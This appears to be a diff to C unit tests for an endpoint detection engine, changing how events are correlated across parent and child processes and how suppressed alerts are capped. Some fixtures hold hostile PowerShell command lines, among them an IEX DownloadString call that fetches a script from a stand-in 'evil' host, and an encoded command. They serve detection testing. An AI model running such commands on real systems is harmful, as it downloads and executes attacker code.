@@ -230,6 +230,8 @@ static void test_process_context_window_correlates_remote_script(void) {
   init(&r1);
   r1.type = EDR_EVENT_NET_CONNECT;
   r1.pid = 9901u;
+  r1.process_start_key = 0x9901u;
+  r1.process_creation_filetime_100ns = 133801632000099010ULL;
   r1.event_time_ns = 1779338600000000000LL;
   snprintf(r1.process_name, sizeof(r1.process_name), "%s", "powershell.exe");
   snprintf(r1.net_dst, sizeof(r1.net_dst), "%s", "203.0.113.77");
@@ -239,6 +241,8 @@ static void test_process_context_window_correlates_remote_script(void) {
   init(&r2);
   r2.type = EDR_EVENT_SCRIPT_POWERSHELL;
   r2.pid = 9901u;
+  r2.process_start_key = r1.process_start_key;
+  r2.process_creation_filetime_100ns = r1.process_creation_filetime_100ns;
   r2.event_time_ns = 1779338605000000000LL;
   snprintf(r2.process_name, sizeof(r2.process_name), "%s", "powershell.exe");
   snprintf(r2.cmdline, sizeof(r2.cmdline), "%s", "powershell.exe -nop -enc SQBFAFgA");
@@ -253,13 +257,15 @@ static void test_process_context_window_correlates_remote_script(void) {
   assert(strstr(r2.detection_context, "\"process_context\":true") != NULL);
 }
 
-static void test_process_tree_context_correlates_parent_child(void) {
+static void test_pid_only_parent_context_does_not_cross_generations(void) {
   EdrBehaviorRecord parent;
   EdrBehaviorRecord child;
   EdrDetectionDecision d;
   init(&parent);
   parent.type = EDR_EVENT_SCRIPT_POWERSHELL;
   parent.pid = 9902u;
+  parent.process_start_key = 0x9902u;
+  parent.process_creation_filetime_100ns = 133801632000099020ULL;
   parent.event_time_ns = 1779338610000000000LL;
   snprintf(parent.process_name, sizeof(parent.process_name), "%s", "powershell.exe");
   snprintf(parent.cmdline, sizeof(parent.cmdline), "%s", "powershell.exe -nop IEX DownloadString('https://evil/a.ps1')");
@@ -270,19 +276,18 @@ static void test_process_tree_context_correlates_parent_child(void) {
   child.type = EDR_EVENT_PROCESS_CREATE;
   child.pid = 9903u;
   child.ppid = 9902u;
+  child.process_start_key = 0x9903u;
+  child.process_creation_filetime_100ns = 133801632000099030ULL;
   child.event_time_ns = 1779338615000000000LL;
   snprintf(child.process_name, sizeof(child.process_name), "%s", "regsvr32.exe");
   snprintf(child.exe_path, sizeof(child.exe_path), "%s", "C:\\Windows\\System32\\regsvr32.exe");
   snprintf(child.cmdline, sizeof(child.cmdline), "%s", "regsvr32.exe normal.dll");
   edr_detection_decision_evaluate(&child, &d);
   assert(!d.drop);
-  assert(!d.suppress);
-  assert(d.context_correlated);
-  assert(d.confidence >= 0.55f);
-  assert(d.trigger_pmfe_scan);
-  assert(strstr(d.reason, "process_tree_parent_remote_script") != NULL);
-  assert(strstr(child.detection_context, "\"process_context\":true") != NULL);
-  assert(strstr(child.detection_context, "process_context_high_signal") != NULL);
+  assert(d.suppress);
+  assert(!d.context_correlated);
+  assert(strstr(d.reason, "process_tree_parent_remote_script") == NULL);
+  assert(strstr(child.detection_context, "\"process_context\":false") != NULL);
 }
 
 static void test_file_policy_allowlist_suppresses_known_rmm(void) {
@@ -385,6 +390,25 @@ static void test_event_quality_p0_forces_alert(void) {
   edr_detection_decision_evaluate(&r, &d);
   assert(!d.drop);
   assert(strcmp(d.selection_action, "emit_alert") == 0);
+}
+
+static void test_event_quality_suppressed_p0_caps_at_context(void) {
+  EdrBehaviorRecord r;
+  EdrDetectionDecision d;
+  init(&r);
+  r.priority = 0u;
+  test_setenv("EDR_DETECTION_FP_FEEDBACK",
+              "FDSensorTaskLaunch.ps1,C:\\Program Files\\FDSecurity\\");
+  snprintf(r.process_name, sizeof(r.process_name), "%s", "powershell.exe");
+  snprintf(r.exe_path, sizeof(r.exe_path), "%s",
+           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
+  snprintf(r.cmdline, sizeof(r.cmdline), "%s",
+           "powershell.exe -File C:\\Program Files\\FDSecurity\\FDSensorTaskLaunch.ps1");
+  edr_detection_decision_evaluate(&r, &d);
+  assert(d.suppress);
+  assert(!d.drop);
+  assert(strcmp(d.selection_action, "emit_context") == 0);
+  test_unsetenv("EDR_DETECTION_FP_FEEDBACK");
 }
 
 static void test_conditional_suppression_downgrades_matching_variant(void) {
@@ -524,12 +548,13 @@ int main(void) {
   test_pmfe_suspicious_shellcode_followup_keeps_alert();
   test_rmm_enterprise_allowlist_policy_suppresses_remote_noise();
   test_process_context_window_correlates_remote_script();
-  test_process_tree_context_correlates_parent_child();
+  test_pid_only_parent_context_does_not_cross_generations();
   test_file_policy_allowlist_suppresses_known_rmm();
   test_false_positive_feedback_policy_suppresses_known_tool();
   test_event_quality_high_signal_emits_alert();
   test_event_quality_fp_feedback_downgrades();
   test_event_quality_p0_forces_alert();
+  test_event_quality_suppressed_p0_caps_at_context();
   test_conditional_suppression_downgrades_matching_variant();
   test_conditional_suppression_skips_high_signal();
   test_ransom_recovery_requires_dangerous_args();
